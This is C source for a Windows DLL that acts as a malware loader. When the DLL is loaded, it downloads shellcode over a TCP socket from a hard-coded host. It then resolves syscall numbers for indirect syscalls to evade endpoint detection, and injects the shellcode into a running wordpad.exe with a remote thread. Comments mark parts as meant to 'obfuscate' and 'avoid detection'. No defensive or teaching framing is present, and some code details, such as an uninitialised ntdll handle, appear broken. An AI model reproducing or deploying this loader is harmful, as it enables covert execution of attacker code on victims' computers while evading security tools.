#include <stdbool.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "mainDLL.h"


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        main();
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DWORD getProcessPID(const char* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (_stricmp(entry.szExeFile, processName) == 0) {
                NtClose(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    NtClose(snapshot);
    return 0;
}

BOOL IndirectPrelude(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFunctionSSN, PUINT_PTR NtFunctionSyscall) {
    DWORD SyscallNumber = 0;
    UINT_PTR NtFunctionAddress = 0;
    UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };
    
    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (NtFunctionAddress == 0) {
        return FALSE;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
    *NtFunctionSyscall = NtFunctionAddress + 0x12;

    if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) == 0) {
        return TRUE;
    }
    return FALSE;
}

BOOL main() {
    NTSTATUS Status = 0;
    BOOL State = TRUE;
    unsigned char shellcode[107550];
    SIZE_T shellcodeSize = sizeof(shellcode);
    HMODULE NtdllHandle = NULL;
    PVOID Buffer = NULL;
    HANDLE thread = NULL;
    HANDLE procH = NULL;
    OBJECT_ATTRIBUTES OA;

    if (!downloadPayload(shellcode, shellcodeSize)) {
        return FALSE;
    }

    if (GetModuleHandleW(L"NTDLL") == NULL) {
        return FALSE; 
    }

    BOOL results[] = {
        IndirectPrelude(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall),
        IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemoryEx", &g_NtAllocateVirtualMemoryExSSN, &g_NtAllocateVirtualMemoryExSyscall),
        IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall),
        IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall),
        IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall),
        IndirectPrelude(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN, &g_NtFreeVirtualMemorySyscall),
        IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall),
        IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall)
    };

    for (int i = 0; i < sizeof(results) / sizeof(results[0]); ++i) {
        if (!results[i]) {
            return FALSE;
        }
    }

    DWORD PID = getProcessPID("wordpad.exe");
    CLIENT_ID CID = {PID, NULL};
    InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);

    Status = NtOpenProcess(&procH, PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        return FALSE;
    }

    Status = NtAllocateVirtualMemoryEx(procH, &Buffer, &shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE, NULL, 0);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    ULONG oldProtect;
    Status = NtWriteVirtualMemory(procH, Buffer, &shellcode, shellcodeSize, NULL);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    Status = NtProtectVirtualMemory(procH, &Buffer, (PULONG)&shellcodeSize, PAGE_EXECUTE, &oldProtect);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    Status = NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, &OA, procH, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    LARGE_INTEGER timeout;
    timeout.QuadPart = 9223372036854775807;  // to avoid detection
    Status = NtWaitForSingleObject(thread, FALSE, &timeout);

CLEANUP:
    if (Buffer) {
        Status = NtFreeVirtualMemory(procH, &Buffer, &shellcodeSize, MEM_DECOMMIT);
    }

    if (thread) {
        NtClose(thread);
    }

    if (procH) {
        NtClose(procH);
    }

    return State;
}

BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
    size_t totalBytesReceived = 0;

    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        return FALSE;
    }

    SOCKET WSAAPI clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        return FALSE;
    }

    struct sockaddr_in clientAddress;
    clientAddress.sin_family = AF_INET;
    clientAddress.sin_port = htons(1234); 
    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9"); //obfuscate

    result = connect(clientSocket, (struct sockaddr*)&clientAddress, sizeof(clientAddress));
    if (result == SOCKET_ERROR) {
        return FALSE;
    }

    const char* message = "Hello, Server!";
    result = send(clientSocket, message, (int)strlen(message), 0);
    if (result == SOCKET_ERROR) {
        return FALSE;
    } 

    size_t bytesRead;
    while (totalBytesReceived < limit) {
        bytesRead = recv(clientSocket, shellcode + totalBytesReceived, limit - totalBytesReceived, 0);
        if (bytesRead == -1) {
            return FALSE;
        }
        totalBytesReceived += bytesRead;
    }

    closesocket(clientSocket);
    WSACleanup();
    return TRUE;
}
